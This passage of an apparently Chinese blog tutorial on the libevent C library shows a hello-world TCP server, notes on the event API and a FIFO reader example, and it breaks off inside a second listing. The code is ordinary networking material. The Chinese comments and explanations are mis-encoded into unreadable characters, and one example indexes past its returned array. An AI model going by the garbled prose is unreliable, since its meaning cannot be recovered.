class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/buffer.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/util.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> MESSAGE[] = <span class="string">"Hello, World!\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŒ‡å®šç«¯å£</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> PORT = <span class="number">9995</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å£°æ˜é™æ€å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">listener_cb</span><span class="params">(struct evconnlistener *, <span class="keyword">evutil_socket_t</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">    struct sockaddr *, <span class="keyword">int</span> socklen, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">conn_writecb</span><span class="params">(struct bufferevent *, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">conn_eventcb</span><span class="params">(struct bufferevent *, short, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">signal_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span>, short, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span>;</span> <span class="comment">//libeventåŸºç¡€å£°æ˜ã€‚ç›¸å½“äºä¸€ä¸ªåº•åº§</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span>;</span> <span class="comment">//ç›‘å¬ï¼Œç”¨äºå»ºç«‹è¿æ¥</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">signal_event</span>;</span> <span class="comment">//ä¿¡å·äº‹ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span> <span class="comment">//åœ°å€ç»“æ„</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">WSADATA wsa_data;</span><br><span class="line">WSAStartup(<span class="number">0x0201</span>, &amp;wsa_data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">base = event_base_new(); <span class="comment">//åˆ›å»ºåº•åº§</span></span><br><span class="line"><span class="keyword">if</span> (!base) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not initialize libevent!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>)); <span class="comment">//åœ°å€ç»“æ„æ¸…é›¶</span></span><br><span class="line"><span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">sin</span>.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//ç›¸å½“äºsocketã€bindã€listenã€acceptçš„èåˆ</span></span><br><span class="line">listener = evconnlistener_new_bind(base, listener_cb, (<span class="keyword">void</span> *)base,</span><br><span class="line">    LEV_OPT_REUSEABLE|LEV_OPT_CLOSE_ON_FREE, <span class="number">-1</span>,</span><br><span class="line">    (struct sockaddr*)&amp;<span class="built_in">sin</span>,</span><br><span class="line">    <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!listener) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not create a listener!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//åˆ›å»ºä¿¡å·äº‹ä»¶</span></span><br><span class="line">signal_event = evsignal_new(base, SIGINT, signal_cb, (<span class="keyword">void</span> *)base);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!signal_event || event_add(signal_event, <span class="literal">NULL</span>)&lt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not create/add a signal event!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//ç›¸å½“äºwhileå¾ªç¯+select/poll/epoll</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//é‡Šæ”¾ç›¸å…³äº‹ä»¶</span></span><br><span class="line">evconnlistener_free(listener); </span><br><span class="line">event_free(signal_event);</span><br><span class="line">event_base_free(base);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">listener_cb(struct evconnlistener *listener, <span class="keyword">evutil_socket_t</span> fd,</span><br><span class="line">    struct sockaddr *sa, <span class="keyword">int</span> socklen, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">user_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span>;</span></span><br><span class="line"></span><br><span class="line">bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"><span class="keyword">if</span> (!bev) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error constructing bufferevent!"</span>);</span><br><span class="line">event_base_loopbreak(base);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_setcb(bev, <span class="literal">NULL</span>, conn_writecb, conn_eventcb, <span class="literal">NULL</span>);</span><br><span class="line">bufferevent_enable(bev, EV_WRITE);</span><br><span class="line">bufferevent_disable(bev, EV_READ);</span><br><span class="line"></span><br><span class="line">bufferevent_write(bev, MESSAGE, <span class="built_in">strlen</span>(MESSAGE));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">conn_writecb(struct bufferevent *bev, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evbuffer</span> *<span class="title">output</span> = <span class="title">bufferevent_get_output</span>(<span class="title">bev</span>);</span></span><br><span class="line"><span class="keyword">if</span> (evbuffer_get_length(output) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flushed answer\n"</span>);</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">conn_eventcb(struct bufferevent *bev, short events, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Connection closed.\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (events &amp; BEV_EVENT_ERROR) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Got an error on the connection: %s\n"</span>,</span><br><span class="line">    strerror(errno));<span class="comment">/*XXX win32*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* None of the other events can happen here, since we haven't enabled</span></span><br><span class="line"><span class="comment"> * timeouts */</span></span><br><span class="line">bufferevent_free(bev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">signal_cb(<span class="keyword">evutil_socket_t</span> sig, short events, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">user_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">delay</span> = &#123;</span> <span class="number">2</span>, <span class="number">0</span> &#125;; <span class="comment">//å»¶è¿Ÿä¸¤ç§’</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Caught an interrupt signal; exiting cleanly in two seconds.\n"</span>);</span><br><span class="line"></span><br><span class="line">event_base_loopexit(base, &amp;delay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="libeventæ¡†æ¶"><a href="#libeventæ¡†æ¶" class="headerlink" title="libeventæ¡†æ¶"></a>libeventæ¡†æ¶</h4><h5 id="åˆ›å»ºevent-base"><a href="#åˆ›å»ºevent-base" class="headerlink" title="åˆ›å»ºevent_base"></a>åˆ›å»ºevent_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="function">struct event_base *<span class="title">event_base_new</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br></pre></td></tr></table></figure><h5 id="åˆ›å»ºäº‹ä»¶"><a href="#åˆ›å»ºäº‹ä»¶" class="headerlink" title="åˆ›å»ºäº‹ä»¶"></a>åˆ›å»ºäº‹ä»¶</h5><ul><li>å¸¸è§„äº‹ä»¶ <code>event</code>â€”-&gt;<code>event_new()</code></li><li>å¸¦ç¼“å†²åŒºçš„äº‹ä»¶ <code>bufferevent</code> â€”-&gt;<code>bufferevent_socket_new()</code></li></ul><h5 id="æ·»åŠ äº‹ä»¶"><a href="#æ·»åŠ äº‹ä»¶" class="headerlink" title="æ·»åŠ äº‹ä»¶"></a>æ·»åŠ äº‹ä»¶</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_add</span><span class="params">(struct event *ev,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="å¯åŠ¨å¾ªç¯"><a href="#å¯åŠ¨å¾ªç¯" class="headerlink" title="å¯åŠ¨å¾ªç¯"></a>å¯åŠ¨å¾ªç¯</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_dispatch</span><span class="params">(struct event_base *base)</span></span>;</span><br><span class="line">base:event_base_new å‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">  æˆåŠŸï¼š<span class="number">0</span>ï¼Œå¤±è´¥ï¼š<span class="number">-1</span></span><br></pre></td></tr></table></figure><p>åªæœ‰<code>event_new</code>ä¸­æŒ‡å®šäº†<code>EV_PERSIST</code>æ‰æŒç»­è§¦å‘ï¼Œå¦åˆ™åªè§¦å‘ä¸€æ¬¡ï¼Œå°±è·³å‡ºå¾ªç¯</p><p>é€šå¸¸è®¾ç½®ä¸º<code>EV_WRITE|EV_PERSIST</code>ã€<code>EV_READ|EV_PERSIST</code></p><h5 id="å…¶ä»–å¾ªç¯"><a href="#å…¶ä»–å¾ªç¯" class="headerlink" title="å…¶ä»–å¾ªç¯"></a>å…¶ä»–å¾ªç¯</h5><p>åœ¨æŒ‡å®šæ—¶é—´ååœæ­¢å¾ªç¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_loopexit</span><span class="params">(struct event_base *base,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br></pre></td></tr></table></figure><p>ç«‹å³åœæ­¢å¾ªç¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_loopbreak</span><span class="params">(struct event_base *base)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="é‡Šæ”¾event-base"><a href="#é‡Šæ”¾event-base" class="headerlink" title="é‡Šæ”¾event_base"></a>é‡Šæ”¾event_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event_base_free(base);</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹æ”¯æŒå“ªäº›å¤šè·¯I-O"><a href="#æŸ¥çœ‹æ”¯æŒå“ªäº›å¤šè·¯I-O" class="headerlink" title="æŸ¥çœ‹æ”¯æŒå“ªäº›å¤šè·¯I/O"></a>æŸ¥çœ‹æ”¯æŒå“ªäº›å¤šè·¯I/O</h4><p><code>event.c</code>ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">event_base_new</span>();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> **buf;</span><br><span class="line">buf = event_get_supported_methods();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buf[%d]=%s\n"</span>,i,buf[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gccç¼–è¯‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc event.c -o event -l event</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°macå¹¶ä¸æ”¯æŒ<code>epoll</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro event % ./event </span><br><span class="line">buf[<span class="number">0</span>]=poll</span><br><span class="line">buf[<span class="number">1</span>]=select</span><br><span class="line">buf[<span class="number">2</span>]=(null)</span><br><span class="line">buf[<span class="number">3</span>]=(null)</span><br><span class="line">buf[<span class="number">4</span>]=(null)</span><br><span class="line">buf[<span class="number">5</span>]=(null)</span><br><span class="line">buf[<span class="number">6</span>]=(null)</span><br><span class="line">buf[<span class="number">7</span>]=(null)</span><br><span class="line">buf[<span class="number">8</span>]=(null)</span><br><span class="line">buf[<span class="number">9</span>]=(null)</span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºäº‹ä»¶-1"><a href="#åˆ›å»ºäº‹ä»¶-1" class="headerlink" title="åˆ›å»ºäº‹ä»¶"></a>åˆ›å»ºäº‹ä»¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct event *<span class="title">event_new</span><span class="params">(struct event_base *base,<span class="keyword">evutil_socket_t</span> fd,short what,event_callback_fn cb,<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"></span><br><span class="line">base: event_base_new()è¿”å›å€¼</span><br><span class="line">  fd: ç»‘å®šåˆ°eventä¸Šçš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">  what: å¯¹åº”çš„äº‹ä»¶(è¯»ã€å†™ã€å¼‚å¸¸)</span><br><span class="line">    EV_READ ä¸€æ¬¡è¯»äº‹ä»¶</span><br><span class="line">    EV_WRITE ä¸€æ¬¡å†™äº‹ä»¶</span><br><span class="line">    EV_PERSIST æŒç»­è§¦å‘ï¼Œç»“åˆevent_base_dispatchå‡½æ•°ä½¿ç”¨</span><br><span class="line">  cb: ä¸€æ—¦äº‹ä»¶æ»¡è¶³ç›‘å¬æ¡ä»¶ï¼Œå›è°ƒçš„å‡½æ•°</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*event_callback_fn)</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short,<span class="keyword">void</span> *)</span></span></span><br><span class="line">  arg: å›è°ƒçš„å‡½æ•°çš„å‚æ•°</span><br><span class="line">  è¿”å›å€¼: æˆåŠŸåˆ›å»ºçš„event</span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ äº‹ä»¶åˆ°base"><a href="#æ·»åŠ äº‹ä»¶åˆ°base" class="headerlink" title="æ·»åŠ äº‹ä»¶åˆ°base"></a>æ·»åŠ äº‹ä»¶åˆ°base</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_add</span><span class="params">(struct event *ev,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br><span class="line"></span><br><span class="line">ev: event_new()å‡½æ•°è¿”å›çš„äº‹ä»¶</span><br><span class="line">  tv: <span class="literal">NULL</span>,å³ä¸ä¼šè¶…æ—¶ ä¸€æ—¦ç­‰åˆ°äº‹ä»¶è¢«è§¦å‘ï¼Œå›è°ƒå‡½æ•°ä¼šè¢«è°ƒç”¨</span><br></pre></td></tr></table></figure><h4 id="ä»baseæ‹¿ä¸‹äº‹ä»¶"><a href="#ä»baseæ‹¿ä¸‹äº‹ä»¶" class="headerlink" title="ä»baseæ‹¿ä¸‹äº‹ä»¶"></a>ä»baseæ‹¿ä¸‹äº‹ä»¶</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_del</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  ev: event_new()çš„è¿”å›å€¼</span><br></pre></td></tr></table></figure><h4 id="é”€æ¯äº‹ä»¶"><a href="#é”€æ¯äº‹ä»¶" class="headerlink" title="é”€æ¯äº‹ä»¶"></a>é”€æ¯äº‹ä»¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_free</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  ev: event_new()çš„è¿”å›å€¼</span><br><span class="line">  æˆåŠŸ: <span class="number">0</span></span><br><span class="line">  å¤±è´¥: <span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨libeventè¯»å†™fifo"><a href="#ä½¿ç”¨libeventè¯»å†™fifo" class="headerlink" title="ä½¿ç”¨libeventè¯»å†™fifo"></a>ä½¿ç”¨libeventè¯»å†™fifo</h4><p><code>read_fifo.c</code>ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//è¯»ç®¡é“</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read event: %s \n"</span>,what &amp; EV_READ ?<span class="string">"Yes"</span>:<span class="string">"No"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"data len = %d,buf = %s\n"</span>,len,buf);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯»ç®¡é“</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">unlink(<span class="string">"myfifo"</span>);</span><br><span class="line">mkfifo(<span class="string">"myfifo"</span>,<span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"myfifo"</span>,O_RDONLY | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªevent_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºäº‹ä»¶</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">ev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">ev = event_new(base,fd,EV_READ|EV_PERSIST,read_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ·»åŠ äº‹ä»¶</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//äº‹ä»¶å¾ªç¯</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡Šæ”¾èµ„æº</span></span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>write_fifo.c</code>ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 